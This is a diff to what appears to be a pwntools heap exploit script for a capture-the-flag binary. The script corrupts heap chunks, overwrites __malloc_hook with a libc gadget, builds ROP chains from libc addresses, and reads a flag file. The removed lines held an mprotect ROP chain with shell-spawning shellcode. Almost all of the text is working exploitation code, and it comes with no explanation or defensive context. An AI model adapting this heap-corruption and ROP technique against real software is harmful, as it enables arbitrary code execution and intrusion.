@@ -86,22 +86,19 @@ def exp():
     Add(2,'a'*0x300)
 
     Add(2,'a'*0x300)
-    rops = 'a'*0x68+p64(heap_base+0x44b0)+p64(0x21000)
-    rops += 'a'*0x18
-    rops += p64(7)+'a'*0x20
-    rops += p64(heap_base+0x44b0+len(rops)+8)+p64(libc_base+libc.sym['mprotect'])
-    rops += asm(shellcraft.amd64.linux.sh())
-    Edit(2,'/flag'.ljust(8,'\x00'))
+    Edit(2,'./flag'.ljust(8,'\x00'))
 
 
     Edit(1,'a'*0x300+p64(0)+p64(0x101)+p64(heap_base+(0x000055555555c460-0x555555559000))+p64(heap_base+0x1f))
 
     #trigger
 
+
     Add(0,'a'*0x217)
 
     Delete(0)
     Edit(0,p64(libc_base+libc.sym['__malloc_hook']))
+    #gdb.attach(p,'b calloc')
     Add(0,'a'*0xf0)
 
     BackDoor('a')
@@ -113,7 +110,7 @@ def exp():
     payload = p64(magic_gadget)
 
     BackDoor(payload)
-    gdb.attach(p)
+
     p_rdi = libc_base + 0x0000000000026542
     p_rsi = libc_base + 0x0000000000026f9e
     p_rdx = libc_base + 0x000000000012bda6
@@ -143,6 +140,6 @@ def exp():
     Add(0,rops)
 
 
-    p.interactive()
+    p.interactive('$ xmzyshypnc')
 
 exp()
